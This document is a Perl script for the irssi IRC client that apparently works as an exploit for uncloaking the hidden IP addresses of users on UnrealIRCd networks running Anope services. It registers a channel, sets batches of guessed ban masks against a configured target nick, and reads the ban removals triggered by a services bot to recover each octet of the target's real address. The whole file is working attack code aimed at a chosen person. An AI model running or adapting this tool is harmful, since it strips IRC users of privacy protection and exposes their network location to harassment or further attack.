#!/usr/bin/env perl -w
#
# unreal-uncloak.pl by Derek Callaway [decal AT ethernet DOT org]
#
# This script should be loaded by irssi!
# Also, Irssi.pm should exist in the Perl library load path: @INC
#
# Code to uncloak IP addresses on UnrealIRCd (unrealircd.org) and
# Anope (anope.org) by enumerating banmasks with octets likely to match
# and observing when server/services mode hacks occur to determine accurate
# values for particular pieces of the address being targeted. Other more
# efficient techniques are possible as implemented by the exploit for the
# the FreeNode network's ircd-seven daemon and atheme services.
#

# Ensure the Irssi module package is in a path held by the @INC array
use Irssi;
use strict;
use warnings;
use vars qw($VERSION %IRSSI %HELP);

our($true, $false) = (1, 0);

# Special IPv4 address ranges as specified in IETF RFC 5735 Section 4
# Note: Skipping over these blocks will optimize the uncloaking process
my @ipv4_specs = ('10.0.0.0/8','127.0.0.0/8','169.254.0.0/16','172.16.0.0/12','192.0.0.0/24','192.0.2.0/24','192.88.99.0/24','192.168.0.0/16','198.18.0.0/15','198.51.100.0/24','203.0.113.0/24','224.0.0.0/4','240.0.0.0/4');

$HELP{'uncloak1'} = 'UNCLOAK1';
$HELP{'uncloak2'} = 'UNCLOAK2';
$HELP{'uncloakhelp'} = 'UNCLOAKHELP';

$VERSION = '1.0';

%IRSSI = (
	authors         => 'Derek Callaway',
	contact         => 'decal@ethernet.org',
	name            => 'uncloakirc-unreal-anope',
	description     => 'Enumerates cloaked hostnames via Anope services on UnrealIRCd',
	license         => 'GNU GPLv2 or later',
	changed         => 'Sat Apr 6 15:00:00 EDT 2013',
);

sub setaddstr { Irssi::settings_add_str('uncloak', $_[0], ''); }
sub setaddint { Irssi::settings_add_int('uncloak', $_[0], 0); }

setaddstr('server_nick');
setaddstr('chanserv_nick');
setaddstr('nickserv_nick');
setaddstr('botserv_nick');
setaddstr('chanserv_pass');
setaddstr('nickserv_pass');
setaddstr('uncloak_chan');
setaddstr('uncloak_nick');
setaddstr('chanbot_nick');
setaddint('chanbans_max');
setaddint('modestack_max');
setaddint('privchan_max');
setaddint('uncloak_debug');

sub setsetstr { Irssi::settings_set_str($_[0], "$_[1]"); }
sub setsetint { Irssi::settings_set_int($_[0], int $_[1]); }

setsetstr('server_nick', 'X-Ray');
setsetstr('chanserv_nick', 'ChanServ');
setsetstr('nickserv_nick', 'NickServ');
setsetstr('botserv_nick', 'BotServ');
setsetstr('chanserv_pass', 'p4ssw0rd');
setsetstr('nickserv_pass', 'p4ssw0rd');
setsetstr('uncloak_chan', '##xrr');
setsetstr('uncloak_nick', 'TheTarget');
setsetstr('chanbot_nick', 'ChanBot');
setsetint('chanbans_max', 60);
setsetint('privchan_max', 4);
setsetint('modestack_max', 12);
setsetint('uncloak_debug', $true);

sub setgetstr { return lc(Irssi::settings_get_str($_[0])); }
sub setgetint { return Irssi::settings_get_int($_[0]); }

my $server_altnick = setgetstr('alternate_nick');
my $server_nick    = $server_altnick ? $server_altnick : (setgetstr('nick') . '-'); 
my $chanserv_nick  = setgetstr('chanserv_nick');
my $nickserv_nick  = setgetstr('nickserv_nick');
my $botserv_nick   = setgetstr('botserv_nick');
my $chanserv_pass  = setgetstr('chanserv_pass');
my $nickserv_pass  = setgetstr('nickserv_pass');
my $uncloak_chan   = setgetstr('uncloak_chan');
my $uncloak_nick   = setgetstr('uncloak_nick');
my $chanbot_nick   = setgetstr('chanbot_nick');
my $privchan_max   = int(setgetint('privchan_max') ? setgetint('privchan_max') : 4);
my $chanbans_max   = 1 + int setgetint('chanbans_max');
my $modestack_max  = int setgetint('modestack_max');
my $uncloak_debug  = int (setgetint('uncloak_debug') ? 1 : 0);

my($octet0, $octet1, $octet2, $octet3, $ref);
my($banmask0, $banmask1) = ('*!*@', '.*');

my(@initmsg) = (q{Uncloak script initialization started..}, q{Finished uncloak script prerequisites!});
my $servmsg = q{Not connected to a server!};
my $windmsg = q{Not currently in an active channel window!};
my $nickmsg = q{uncloak_nick string value not /set!};
my $csrvmsg = q{Please /set chanserv_nick to the appropriate value!};
my $nsrvmsg = q{Please /set nickserv_nick to the appropriate value!};
my $dchnmsg = q{Please /set uncloak_chan to the appropriate value!};
my $cbotmsg = q{Please /set chanbot_nick to the appropriate value!};
my $cbnsmsg = q{Please /set chanbans_max to the appropriate value!};
my $mstkmsg = q{Please /set modestack_max to the appropriate value!};

srand(rand(2 ** 14) ^ time() * rand(rand() % 64));

sub act_print {
  Irssi::active_win->print(@_);
}

sub cmd_uncloak1 {
	my($data, $server, $witem) = @_;

	undef($octet0);
	undef($octet1);
	undef($octet2);
	undef($octet3);

	if (not($server and $server->{connected})) {
		act_print($servmsg);

		return $false;
	} elsif($witem->{type} ne 'CHANNEL') {
		act_print($windmsg);

		return $false;
	} elsif(!defined($uncloak_nick)) {
	  act_print($nickmsg);

		return $false;
	} elsif(!defined($chanserv_nick)) {
	  act_print($csrvmsg);

		return $false;
	} elsif(!defined($nickserv_nick)) {
	  act_print($nsrvmsg);

		return $false;
	} elsif(!defined($uncloak_chan)) {
	  act_print($dchnmsg);

		return $false;
	}	elsif(!defined($cbotmsg)) {
	  act_print($cbotmsg);
		 
    return $false;
	}

  act_print($initmsg[0]);

  $server->command("MSG $nickserv_nick REGISTER $nickserv_pass");
  $server->command("MSG $nickserv_nick IDENTIFY $nickserv_pass");
  $server->command("MSG $chanserv_nick IDENTIFY $uncloak_chan $chanserv_pass");

	select(undef, undef, undef, rand(0.32));

  $server->command("MSG $chanserv_nick CLEAR $uncloak_chan BANS");
  $server->command("MSG $chanserv_nick CLEAR $uncloak_chan EXCEPTS");
  $server->command("MSG $chanserv_nick OP $uncloak_chan $server_nick");

	sleep(1);

  $server->command("MSG $chanserv_nick PROTECT $uncloak_chan $server_nick");
  $server->command("MSG $chanserv_nick SET $uncloak_chan PEACE ON");
  $server->command("MSG $botserv_nick SET $uncloak_chan FANTASY ON");

	select(undef, undef, undef, rand(0.32));

  $server->command("MSG $botserv_nick SET $uncloak_chan DONTKICKOPS ON");
  $server->command("MSG $botserv_nick ASSIGN $uncloak_chan $chanbot_nick");
  $server->command("MODE $uncloak_chan +pntlev $privchan_max *!*@* $uncloak_nick");

  sleep(1);

  act_print($initmsg[1]);

	return $true;
}

Irssi::command_bind('uncloak1' => \&cmd_uncloak1);

sub cmd_uncloak2 {
	my($data, $server, $witem) = @_;
  my $amode = my $modestr = "MODE $uncloak_chan +b";

  if($uncloak_debug) {
	  act_print("DEBUG1 defined(\$octet0): " . defined($octet0));
	}

	if(!defined($octet0)) { $ref = \$octet0; }
	elsif(!defined($octet1)) { $ref = \$octet1; } 
	elsif(!defined($octet2)) { $ref = \$octet2; }
	else { if(!defined($octet3)) { $ref = \$octet3; } else { act_print($octet0.'.'.$octet1.'.'.$octet2.'.'.$octet3); return; } } 

  OUTER: foreach my $acnt (0 .. 254) {
	  next OUTER if(!$octet0 && (($acnt == 10 || $acnt == 127) || ($acnt >= 224 && $acnt <= 239))); 

    if(!($acnt % $modestack_max)) {
		  my($xa, $xz) = ($acnt - $modestack_max, $acnt);

			INNER: foreach my $bcnt ($xa .. $xz) {
			    next INNER if(!$octet0 && (($bcnt == 10 || $bcnt == 127) || ($bcnt >= 224 && $bcnt <= 239))); 

					$amode .= (' ' . $banmask0 . $bcnt . (defined($octet2) ? '' : $banmask1));
			} # INNER:

      $server->command($amode);
			$server->command("MSG $uncloak_chan !unban $uncloak_nick");

			sleep(1);
			select(undef, undef, undef, rand);

      if($uncloak_debug) {
			  act_print("DEBUG2 defined(\$octet0): " . defined($octet0));
			  act_print("DEBUG2 defined(\$octet1): " . defined($octet1));
			  act_print("DEBUG2 defined(\$octet2): " . defined($octet2));
			  act_print("DEBUG2 defined(\$octet3): " . defined($octet3));
			}

      $server->command("MSG $chanserv_nick CLEAR $uncloak_chan BANS");

      return (${$ref}) if(defined(${$ref}) and length(${$ref}) gt 0);

			$amode = $modestr;
		}
    else {
		  $amode .= 'b';
		}
	} # OUTER: 

	return ${$ref};
}

Irssi::command_bind('uncloak2' => \&cmd_uncloak2);

sub event_mode {
	my($server, $args, $nick, $addr) = @_;
	my($target, $modes, $modeparms) = split(' ', $args, 3);
	my(@modeparm) = split(/ /, $modeparms);
	my($target_type, $modetype, $modechan, $pos) = ('', '', '', 0);

	if($target =~ /^#/) {
		$modechan .= $server->channel_find($target);
		$target_type .= 'channel';
	}
  
  return if(lc($target) ne $uncloak_chan or index($nick, '.') lt 0);

	#emit $chan $mode $param
	if($target_type eq 'channel') {
    foreach my $mode (split(//, $modes)) {
      if($mode eq '+' or $mode eq '-') {
				$modetype .= $mode;
      } elsif($mode eq 'b' and $modetype eq '-') { 
			  if($modeparms =~ /.*[@.]([0-9]+)/) {
				  if(!$octet0) { 
					  $banmask0 = '*!*@' . (${$ref} = $1) . '.';
					} 
					elsif(not($octet1 and $octet2)) { 
						$banmask0 .= (${$ref} = $1) . '.';
						$banmask1 = '' if defined($octet2);
					} elsif(!$octet3) {
						  $banmask0 .= (${$ref} = $1);
						} else { }
					}

					act_print(($octet0 ? '0' : '') . 
					             ($octet1 ? '1' : '') .
											 ($octet2 ? '2' : '') .
											 ($octet3 ? '3' : '') . ' ' . $banmask0 . $banmask1);

				  Irssi::signal_emit('event mode ' . $target_type . $modetype . $mode, $modechan, $nick, $modeparm[$pos++]);
			  } else {
				  Irssi::signal_emit('event mode ' . $target_type . $modetype . $mode, $modechan, $nick);
			}
		}
	}
}

sub cmd_uncloakhelp {
  act_print("UNCLOAK1 - start uncloaking process");
  act_print("UNCLOAK2 - finish uncloaking process");

  return $true;
}

Irssi::command_bind('uncloakhelp' => \&cmd_uncloakhelp);

Irssi::signal_add_last('event mode', \&event_mode);
